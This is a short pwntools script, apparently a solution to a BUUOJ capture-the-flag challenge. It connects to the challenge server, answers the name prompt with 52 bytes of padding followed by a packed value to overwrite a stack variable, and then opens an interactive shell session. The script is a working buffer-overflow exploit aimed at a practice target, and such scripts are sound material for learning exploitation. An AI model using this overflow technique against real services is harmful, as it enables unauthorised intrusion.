from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26497)
io.sendlineafter(b'What\'s your name?', cyclic(4 * 13) + p32(17))

io.interactive()